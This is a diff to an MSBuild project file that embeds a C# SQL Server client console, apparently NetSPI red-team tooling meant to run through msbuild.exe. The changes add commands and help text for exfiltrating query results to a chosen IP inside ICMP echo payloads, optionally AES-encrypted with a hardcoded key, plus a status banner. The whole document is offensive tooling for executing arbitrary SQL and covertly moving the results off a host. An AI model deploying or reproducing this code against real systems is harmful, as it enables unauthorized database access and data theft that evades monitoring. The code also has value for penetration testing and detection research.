@@ -1,7 +1,7 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 	<!--
 		Author: Scott Sutherland (@_nullbind), NetSPI 2019
-		Version: 0.1 (work in progress)
+		Version: 0.2 (work in progress)
 		Description: 
 		This is a simple C# SQL Server client console that can be run through msbuild. 
 
@@ -13,7 +13,7 @@
 		3. ICMP exfiltration is disabled by default. By setting the "enableicmp" variable to true, and 
 		   setting the IP, the results of each query will be sent to the provided IP in the payloads of ICMP echo requests.		  
 		   The payloads are cleartext by default, but payload encryption can be enabled by setting "enableEncryption" variable to "true".
-		   The salt and key are hard coded, and should be changed.  
+		   The salt and key are hard coded, and should be changed. You can update the "_salt" and "mySharedSecret" variables.
 		   The decrypt method can be used to recover the payload on the receiving system. 
 		   Generally cleartext data exfiltration == bad idea.
 		4. Type "help" for basic instructions.
@@ -23,7 +23,7 @@
 		2. In a console, navigate to the folder containing this .csproj or .xml file.
 		3. Run the msbuild.exe command from its path using one of the commands below. 
 		   You can explicitly define the .csproj file to load, but it is not required 
-           if only one .csproj file exists your current working directory. 
+                   if only one .csproj file exists your current working directory. 
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.xml
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj
@@ -200,7 +200,11 @@
 			
 			public static string RunQuery(string MyConnString, string filePath)
 			{											
-				// Read line from the client
+				// Read line from the client	
+				Console.WriteLine("----------");				
+				Console.WriteLine(" -= MSBiuld SQLClient v1.0");
+				Console.WriteLine(" -= Instance:     User:        User Type:");
+				Console.WriteLine(" -= ICMPEXFIL:  EXFILIP:  EXFILEnc:");					
 				Console.WriteLine("----------");
 				Console.Write("SQLCLIENT> ");
 				String MyQuery = Console.ReadLine().ToString();
@@ -222,11 +226,11 @@
 					bool loadCheck = MyQuery.ToLower().Contains("setconn");							
 					if(loadCheck)
 					{
-						Console.Write("\nSetting connection string to:");
+						Console.Write("\n           Connection string set to:");
 						string newcon = MyQuery.Replace("setconn ","");
-						Console.Write("\n" + newcon + "\n");
+						Console.Write("\n" + "           " +newcon + "\n");
 						connString = newcon;
-						fullcommand = "";
+						fullcommand = "";		
 						Console.Write("\nSQLCLIENT> ");								
 					}
 
@@ -238,7 +242,7 @@
 						string newfile = MyQuery.Replace("setfile ","");
 						Console.Write("\n" + newfile + "\n");
 						filePath = newfile;
-						fullcommand = "";
+						fullcommand = "";						
 						Console.WriteLine("----------");
 						Console.Write("\nSQLCLIENT> ");								
 					}						
@@ -251,34 +255,67 @@
 						Console.WriteLine("----------");
 						Console.Write("SQLCLIENT> ");
 					}
+					
+					// Clear console if requested
+					bool statusCheck = MyQuery.ToLower().Contains("status");
+					if(MyQuery.ToLower().Equals("status"))
+					{ 						
+						fullcommand = "";
+						Console.WriteLine("----------");				
+						Console.WriteLine("           Instance:");     
+						Console.WriteLine("           User:"); 
+						Console.WriteLine("           User Type:");
+						Console.WriteLine("           ICMPEXFIL:");  
+						Console.WriteLine("           EXFILIP:");
+						Console.WriteLine("           EXFILEnc:");					
+						Console.WriteLine("----------");						
+						Console.Write("SQLCLIENT> ");
+					}					
 						
 					// Provide help
 					bool helpCheck = MyQuery.ToLower().Contains("help");
 					if(MyQuery.ToLower().Equals("help")){ 							
 						Console.WriteLine("\n");
 						Console.WriteLine(" BELOW IS A LIST OF SUPPORTED COMMANDS");	
-						Console.WriteLine("\n");							
-						Console.WriteLine(" COMMAND    		TSQL queries");
-						Console.WriteLine(" DESCRIPTION		Type the query, then \"go\":");
-						Console.WriteLine(" EXAMPLE    		SELECT @@VERSION");
-						Console.WriteLine("            		GO");
 						Console.WriteLine("\n");
-						Console.WriteLine(" COMMAND    		setconn"); 
-						Console.WriteLine(" DESCRIPTION		By default the connection string is harded coded.  Use this command to change it on the fly.");
-						Console.WriteLine(" EXAMPLE 1  		setconn Server=SERVER1\\Instance;Database=Master;User ID=Username;Password=Password;"); 
-						Console.WriteLine(" EXAMPLE 2  		setconn Server=SERVER1\\Instance;Database=Master;Integrated Security=SSPI;"); 
-						Console.WriteLine(" EXAMPLE 3  		setconn Server=SERVER1\\Instance;Database=Master;Integrated Security=SSPI;uid=domain\\user;pwd=password123"); 
+						Console.WriteLine(" COMMAND: setconn"); 
+						Console.WriteLine("  DESCRIPTION	By default the connection string is harded coded.  Use this command to change it on the fly.");
+						Console.WriteLine("   EXAMPLE 1  	setconn Server=SERVER\\Instance;Database=Master;User ID=Username;Password=Pass123!;"); 
+						Console.WriteLine("   EXAMPLE 2  	setconn Server=SERVER\\Instance;Database=Master;Integrated Security=SSPI;"); 
+						Console.WriteLine("   EXAMPLE 3  	setconn Server=SERVER\\Instance;Database=Master;Integrated Security=SSPI;uid=domain\\user;pwd=Pass123!"); 
+						Console.WriteLine("\n");						
+						Console.WriteLine(" COMMAND: TSQL queries");
+						Console.WriteLine("  DESCRIPTION	Arbitrary TSQL query can be executed once a valid connection string is configured.");
+						Console.WriteLine("                Type the query, then \"go\", and press enter. Multi-line queries are supported.");
+						Console.WriteLine("   EXAMPLE    	SELECT @@VERSION");
+						Console.WriteLine("     	        GO");
 						Console.WriteLine("\n");
-						Console.WriteLine(" COMMAND    		setfile"); 
-						Console.WriteLine(" DESCRIPTION		By default, the output file is c:\\windows\\temp\\output.csv. Use this command to change it on the fly."); 
-						Console.WriteLine(" EXAMPLE    		setfile c:\\windows\\temp\\output.csv"); 
+						Console.WriteLine(" COMMAND: setfile"); 
+						Console.WriteLine("  DESCRIPTION	By default, the output file is c:\\windows\\temp\\output.csv. Use this command to change it on the fly."); 
+						Console.WriteLine("   EXAMPLE    	setfile c:\\windows\\temp\\output.csv"); 
 						Console.WriteLine("\n");
-						fullcommand = "";
+						Console.WriteLine(" COMMAND: seticmp"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the exfilip as well.");
+						Console.WriteLine("   EXAMPLE    	seticmp disable");
+						Console.WriteLine("   EXAMPLE    	seticmp enable");
+						Console.WriteLine("\n");	
+						Console.WriteLine(" COMMAND: setexilip"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP exfiltration is disabled. If enabled, set the exfilip as well."); 
+						Console.WriteLine("   EXAMPLE    	setexilip 127.0.0.1");
+						Console.WriteLine("\n");
+						Console.WriteLine(" COMMAND: seticmpenc"); 
+						Console.WriteLine("  DESCRIPTION	By default, ICMP data exfiltration is done in cleartext, enabled AES payload encryption with this setting."); 
+						Console.WriteLine("                The salt and key are hardcoded. Update the \"_salt\" and \"mySharedSecret\" variables.");
+						Console.WriteLine("   EXAMPLE    	seticmpenc disable");
+						Console.WriteLine("   EXAMPLE    	seticmpenc enable");
+						Console.WriteLine("\n");						
+						fullcommand = "";	
+						Console.WriteLine("----------");						
 						Console.Write("SQLCLIENT> ");
 					}						
 							
 					// Show multi-line input						
-					if((MyQuery.ToLower() != "clear") && (!loadCheck) && (!fileCheck) && (!helpCheck))
+					if((MyQuery.ToLower() != "clear") && (!loadCheck) && (!fileCheck) && (!helpCheck) && (!statusCheck))
 					{ 
 						Console.Write("         > ");
 					}						
@@ -363,14 +400,15 @@
 
 								// encrypt payload
 								string enableEncryption = "false";
-								string encrypted64 = EncryptStringAES(fileContent.ToString(),"changethis");								
+								string mySharedSecret = "changethis";
+								string encrypted64 = EncryptStringAES(fileContent.ToString(), mySharedSecret);								
 							
 								// send results in icmp
 								string enableicmp = "false";
 								if(enableicmp == "true")
 								{
 									// https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
-									string ipaddress = "192.168.1.1";
+									string ipaddress = "127.0.0.1";
 									Ping pingSender = new Ping ();
 									PingOptions options = new PingOptions ();
 
